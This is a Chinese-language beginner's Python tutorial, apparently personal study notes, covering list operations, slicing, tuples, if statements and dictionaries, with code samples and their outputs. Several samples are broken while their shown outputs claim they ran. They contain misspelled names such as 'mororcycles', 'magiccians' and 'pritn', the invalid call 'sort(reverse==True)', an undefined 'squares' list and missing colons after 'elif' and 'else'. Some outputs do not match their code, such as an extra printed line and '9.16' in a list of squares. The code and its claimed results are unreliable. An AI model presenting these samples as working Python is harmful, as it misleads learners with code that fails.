<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#motorcycles.py</span></span><br><span class="line">motorcycles=[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(motorcycles)</span><br><span class="line"></span><br><span class="line">motorcycles[<span class="number">0</span>]=<span class="string">&#x27;ducati&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(motorcycles)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;ducati&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>添加列表元素</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#motorcycles.py</span></span><br><span class="line">motorcycles=[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line"></span><br><span class="line">motorcycles.append(<span class="string">&#x27;ducati&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(motorcycles)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>,<span class="string">&#x27;ducati&#x27;</span>]</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>删除列表元素</p>
<ul>
<li><p>使用del语句删除列表元素</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#motorcycles.py</span></span><br><span class="line">motorcycles=[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(motorcycles)</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> motorcycles[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(motorcycles)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用pop()方法删除列表元素，并返回删除值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#motorcycles.py</span></span><br><span class="line">motorcycles=[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(motorcycles)</span><br><span class="line"></span><br><span class="line">motorcycle=motorcycles.pop(<span class="number">0</span>)<span class="comment">#括号内为标索引则默认删除最后一个元素，并将其返回</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;The first motorcycle I woned was a <span class="subst">&#123;motorcycle.title()&#125;</span>.&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;honda&#x27;,&#x27;yamaha&#x27;,&#x27;suzuki&#x27;]</span><br><span class="line">The first motorcycle I woned was a honda.</span><br></pre></td></tr></table></figure>
</li>
<li><p>根据值删除元素</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">motorcycles=[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>,<span class="string">&#x27;ducati&#x27;</span>]</span><br><span class="line">too_expensive=<span class="string">&#x27;ducati&#x27;</span></span><br><span class="line">mororcycles.remove(too_expensive)</span><br><span class="line"><span class="built_in">print</span>(motorcycles)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\nA <span class="subst">&#123;too_expensive.title()&#125;</span> is too expensive for me!&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line">                                            </span><br><span class="line">A Ducati is too expensive <span class="keyword">for</span> me!</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>使用sort()方法对列表进行永久排序</p>
<ul>
<li>正序(字母表)</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cars.py</span></span><br><span class="line">cars = [<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br><span class="line">cars.sort()</span><br><span class="line"><span class="built_in">print</span>(cars)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>]</span><br></pre></td></tr></table></figure>

<ul>
<li>反序(反字母表)</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cars.py</span></span><br><span class="line">cars = [<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br><span class="line">cars.sort(reverse==<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(cars)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>,<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>]</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用sorted()方法对列表进行临时排序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cars.py</span></span><br><span class="line">cars = [<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Here is the orignal list:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(cars)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Here is the sorted list:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(cars))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(cars,reverse==<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">pritn(<span class="string">&quot;Here is the orignal list agin:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(cars)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Here is the orignal list:</span><br><span class="line">[<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br><span class="line">Here is the sorted list:</span><br><span class="line">[<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>,<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>]</span><br><span class="line">Here is the orignal list agin:</span><br><span class="line">[<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br></pre></td></tr></table></figure>
</li>
<li><p>反向打印列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cars.py</span></span><br><span class="line">cars = [<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(cars)</span><br><span class="line"></span><br><span class="line">cars.reverse()</span><br><span class="line"><span class="built_in">print</span>(cars)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;subaru&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;bmw&#x27;</span>]</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用len()方法列表长度</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cars.py</span></span><br><span class="line">cars = [<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br><span class="line"><span class="built_in">len</span>(cars)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">4</span><br></pre></td></tr></table></figure></li>
</ol>
</blockquote>
<h3 id="操作列表"><a href="#操作列表" class="headerlink" title="操作列表"></a>操作列表</h3><blockquote>
<ol>
<li>遍历列表</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">magicians = [<span class="string">&#x27;alice&#x27;</span>,<span class="string">&#x27;david&#x27;</span>,<span class="string">&#x27;carolina&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> magician <span class="keyword">in</span> magiccians:</span><br><span class="line">    <span class="built_in">print</span>(magician)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">alice</span><br><span class="line">david</span><br><span class="line">carolina</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>创建数值列表</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#values.py</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br><span class="line"><span class="comment">#for 循环打印1-4的整数，range()方法是左闭右开区间[1,5)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#number_list.py</span></span><br><span class="line">numbers = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>))<span class="comment">#使用强制转换将数字转换成列表</span></span><br><span class="line"><span class="built_in">print</span>(numbers)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[1,2,3,4,5]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#even_numbers_list.py</span></span><br><span class="line">even_numbers = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">2</span>,<span class="number">11</span>,<span class="number">2</span>))<span class="comment">#range()方法有3个参数时，第三个参数为步长</span></span><br><span class="line"><span class="built_in">print</span>(even_numbers)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[2,4,6,8,10]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#square_numbers.py</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    square = value ** <span class="number">2</span></span><br><span class="line">    squares.append(square)</span><br><span class="line"><span class="built_in">print</span>(squares)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[1,4,9.16,25,36,49,64,81,100]</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>列表元素统计</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;digits= [1,2,3,4,5,6,7,8,9,0]</span><br><span class="line">&gt;&gt;&gt;min(digits)</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt;max(digits)</span><br><span class="line">9</span><br><span class="line">&gt;&gt;&gt;<span class="built_in">sum</span>(digits)</span><br><span class="line">45</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><strong>列表推导式</strong></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#square_numbers.py</span></span><br><span class="line">squares=[value**<span class="number">2</span> <span class="keyword">for</span> value <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>)]</span><br><span class="line"><span class="built_in">print</span>(squares)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[1,4,9.16,25,36,49,64,81,100]</span><br></pre></td></tr></table></figure>

<ol start="5">
<li><p><em><strong>切片(slice)</strong></em></p>
<p>​		创建切片，需要使用第一个元素和最后一个元素的索引，与range()函数一样，Python 在到达指定的第二个索引之前的元素时停止。要输出列表的前三个元素，要指定索引为0和3，将会返回索引分别为0，1，2的元素。</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#players.py</span></span><br><span class="line">players = [<span class="string">&#x27;charles&#x27;</span>,<span class="string">&#x27;martina&#x27;</span>,<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>,<span class="string">&#x27;eil&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(players[<span class="number">0</span>:<span class="number">3</span>])</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;charles&#x27;</span>,<span class="string">&#x27;martina&#x27;</span>,<span class="string">&#x27;michael&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>​					如果需要提取列表的第二、三、四个元素，要指定索引为1和4</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#players.py</span></span><br><span class="line">players = [<span class="string">&#x27;charles&#x27;</span>,<span class="string">&#x27;martina&#x27;</span>,<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>,<span class="string">&#x27;eil&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(players[<span class="number">1</span>:<span class="number">4</span>])</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;martina&#x27;</span>,<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>​					如若未指定第一个索引，Python将自动从列表开头开始</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#players.py</span></span><br><span class="line">players = [<span class="string">&#x27;charles&#x27;</span>,<span class="string">&#x27;martina&#x27;</span>,<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>,<span class="string">&#x27;eil&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(players[:<span class="number">4</span>])</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;charles&#x27;</span>,martina<span class="string">&#x27;,&#x27;</span>michael<span class="string">&#x27;,&#x27;</span>florence<span class="string">&#x27;]#注意没有到5，则为显示eil</span></span><br></pre></td></tr></table></figure>

<p>​					如若未指定结束索引，Python自动遍历至列表尾部</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#players.py</span></span><br><span class="line">players = [<span class="string">&#x27;charles&#x27;</span>,<span class="string">&#x27;martina&#x27;</span>,<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>,<span class="string">&#x27;eil&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(players[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(players[-<span class="number">3</span>:])</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>,<span class="string">&#x27;eil&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>,<span class="string">&#x27;eil&#x27;</span>]</span><br></pre></td></tr></table></figure>

<ol start="6">
<li><p>遍历切片</p>
<p>​		遍历列表中的部分元素，在for循环中使用列表切片。</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#players.py</span></span><br><span class="line">players = [<span class="string">&#x27;charles&#x27;</span>,<span class="string">&#x27;martina&#x27;</span>,<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>,<span class="string">&#x27;eil&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Here is the first three player on my team:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> player <span class="keyword">in</span> players[:<span class="number">3</span>]:<span class="comment">#只遍历前三名队员</span></span><br><span class="line">    <span class="built_in">print</span>(player.title())</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Here  is the first three player on my team:</span><br><span class="line">Charles</span><br><span class="line">Martina</span><br><span class="line">Michael</span><br></pre></td></tr></table></figure>

<ol start="7">
<li><p>复制列表</p>
<p>​		复制列表，可以创建一个包含整个列表的切片，方法是同时省略起始索引和终止索引([:])。让Python创建一个起始于第一个元素，终止于最后一个元素的切片，即复制整个列表。</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#food.py</span></span><br><span class="line">my_foods=[<span class="string">&#x27;pizza&#x27;</span>,<span class="string">&#x27;falafel&#x27;</span>,<span class="string">&#x27;carrot cake&#x27;</span>]</span><br><span class="line">friend_foods=my_foods[:]<span class="comment">#[:]不能省略，此时是将my_foods的副本赋给friend_foods。</span></span><br><span class="line"><span class="comment">#如若是friend_foods=my_foods则是将my_foods赋值给friend_foods，两个指向同一个列表。</span></span><br><span class="line"></span><br><span class="line">my_foods.append(<span class="string">&#x27;cannoli&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My favorite foods are:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(my_foods)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My friend favorite foods are:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(friend_foods)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">My favorite foods are:</span><br><span class="line">[<span class="string">&#x27;pizza&#x27;</span>,<span class="string">&#x27;falafel&#x27;</span>,<span class="string">&#x27;carrot cake&#x27;</span>,<span class="string">&#x27;cannoli&#x27;</span>]</span><br><span class="line">My friend favorite foods are:</span><br><span class="line">[<span class="string">&#x27;pizza&#x27;</span>,<span class="string">&#x27;falafel&#x27;</span>,<span class="string">&#x27;carrot cake&#x27;</span>]</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h3><blockquote>
<ol>
<li><p><strong>元组定义概念</strong></p>
<p>​		不可变的列表即为元组（tuple)</p>
</li>
<li><p>操作元组</p>
<ul>
<li><p>定义元组</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#dimensions.py</span></span><br><span class="line">dimensions = (<span class="number">200</span>,<span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(dimensions[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(dimensions[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">200</span><br><span class="line">50</span><br></pre></td></tr></table></figure>
</li>
<li><p>​	遍历元组</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#dimensions.py</span></span><br><span class="line">dimensions =(<span class="number">200</span>,<span class="number">50</span>)</span><br><span class="line"><span class="keyword">for</span> dimension <span class="keyword">in</span> dimensions:</span><br><span class="line">    <span class="built_in">print</span>(dimension)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">200</span><br><span class="line">50</span><br></pre></td></tr></table></figure>

<ul>
<li><p>修改元组的值</p>
<p>​	元组的元素是无法被修改的，但是可以给表示元组的变量进行赋值，重新定义元组</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#dimensions.py</span></span><br><span class="line">dimensions = (<span class="number">200</span>,<span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Orignal dimensions:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> dimension <span class="keyword">in</span> dimensions:</span><br><span class="line">    <span class="built_in">print</span>(dimension)</span><br><span class="line">                                                                                </span><br><span class="line">dimensions = (<span class="number">400</span>,<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nModified dimensions:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> dimension <span class="keyword">in</span> dimensions:</span><br><span class="line">    <span class="built_in">print</span>(dimension)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Orignal dimensions:</span><br><span class="line">200</span><br><span class="line">50</span><br><span class="line">                                                                                </span><br><span class="line">Modified dimensions:</span><br><span class="line">400</span><br><span class="line">100</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</blockquote>
<h2 id="条件判度if语句"><a href="#条件判度if语句" class="headerlink" title="条件判度if语句"></a>条件判度if语句</h2><h3 id="测试一个条件"><a href="#测试一个条件" class="headerlink" title="测试一个条件"></a>测试一个条件</h3><blockquote>
<p>只适用仅有一个条件满足的情况</p>
</blockquote>
<ul>
<li><p>if语句</p>
<blockquote>
<p>if 条件为true,执行后续程序；条件为false,跳出判断后续代码；</p>
</blockquote>
</li>
<li><p>if-else语句</p>
<blockquote>
<p>if条件为true,执行if后面程序，否则执行else后面程序</p>
</blockquote>
</li>
<li><p>if-elif-else语句</p>
<blockquote>
<p>if 条件为true，执行if后面程序，程序完成跳出条件判断，否则执行elif 判断条件，当条件为true时，执行elif后续程序，程序代码完成跳出判断，否则执行else后面程序代码，执行完成跳出条件判断</p>
</blockquote>
</li>
<li><p>if-elif-elif语句</p>
</li>
</ul>
<h3 id="测试多个条件"><a href="#测试多个条件" class="headerlink" title="测试多个条件"></a>测试多个条件</h3><blockquote>
<p>需要测试多个条件是否满足的情况</p>
</blockquote>
<ul>
<li>if-if-if</li>
</ul>
<h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><h3 id="概念定义-2"><a href="#概念定义-2" class="headerlink" title="概念定义"></a>概念定义</h3><blockquote>
<p>字典（dictionary)是一系列键值对。每一个键都与值关联，可以使用键来访问相关连的值。在Python中字典用放在花括号“{}”中的一系列键值对来表示的。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#aline.py</span></span><br><span class="line">aline_0 = &#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;points&#x27;</span>:<span class="number">5</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(aline_0[<span class="string">&#x27;color&#x27;</span>])</span><br><span class="line">new_points = cline_0[<span class="string">&#x27;points&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;You just earned <span class="subst">&#123;new_points&#125;</span> points!&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">green</span><br><span class="line">You just earned 5 points!</span><br></pre></td></tr></table></figure>

<h3 id="添加键值对"><a href="#添加键值对" class="headerlink" title="添加键值对"></a>添加键值对</h3><blockquote>
<p>字典是一种动态结构，可以随时在其中添加键值对。需要依次指定字典名，用方括号括起来的键和键关联的值。字典会保留定义是的元素排列顺序。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#alien.py</span></span><br><span class="line">alien_0 = &#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;points&#x27;</span>:<span class="number">5</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(alien_0)</span><br><span class="line"></span><br><span class="line">alien_0[<span class="string">&#x27;x_position&#x27;</span>] = <span class="number">0</span></span><br><span class="line">alien_0[<span class="string">&#x27;y_position&#x27;</span>] = <span class="number">25</span></span><br><span class="line"><span class="built_in">print</span>(alien_0)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;points&#x27;</span>:5&#125;</span><br><span class="line">&#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;points&#x27;</span>:5,<span class="string">&#x27;x_position&#x27;</span>:0,<span class="string">&#x27;y_position&#x27;</span>:25&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果需要使用字典来存储用户提供的数据或编写能自动生成大量键值对的代码，通常先创建一个空字典。</p>
</blockquote>
<h3 id="修改字典中的值"><a href="#修改字典中的值" class="headerlink" title="修改字典中的值"></a>修改字典中的值</h3><blockquote>
<p> 要修改字典中的值，可一次指定字典中的键名，用方括号括起来的键和键关联的新值</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#alien.py</span></span><br><span class="line">alien_0 = &#123;<span class="string">&#x27;x_position&#x27;</span>:<span class="number">0</span>,<span class="string">&#x27;y_position&#x27;</span>:<span class="number">25</span>,<span class="string">&#x27;speed&#x27;</span>:<span class="string">&#x27;medium&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Orignal position:<span class="subst">&#123;alien_0[<span class="string">&#x27;x_position&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> alien_0[<span class="string">&#x27;speed&#x27;</span>] == <span class="string">&#x27;slow&#x27;</span>:</span><br><span class="line">	x_increment = <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> alien_0[<span class="string">&#x27;speed&#x27;</span>] == <span class="string">&#x27;medium&#x27;</span></span><br><span class="line">	x_increment = <span class="number">2</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	x_increment = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">alien_0[<span class="string">&#x27;x_position&#x27;</span>] = x_increment + alien_0[<span class="string">&#x27;x_position&#x27;</span>] </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Now position:<span class="subst">&#123;alien_0[<span class="string">&#x27;x_position&#x27;</span>]&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Orignal position:0</span><br><span class="line">Now position:2</span><br></pre></td></tr></table></figure>

<h3 id="删除键值对-del语句"><a href="#删除键值对-del语句" class="headerlink" title="删除键值对(del语句)"></a>删除键值对(del语句)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#alien.py</span></span><br><span class="line">alien_0 = &#123;</span><br><span class="line">    <span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;position&#x27;</span>:<span class="number">5</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(alien_0)</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> alien_0[<span class="string">&#x27;position&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(alien_0)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;position&#x27;</span>:5&#125;</span><br><span class="line">&#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>&#125;<span class="comment">#删除后将永久消失</span></span><br></pre></td></tr></table></figure>

<h3 id="使用get-访问值"><a href="#使用get-访问值" class="headerlink" title="使用get()访问值"></a>使用get()访问值</h3><p>使用方括号里的键从字典中获取感兴趣的值，可能会引发问题：当指定的键不存在，则会出现错误。</p>
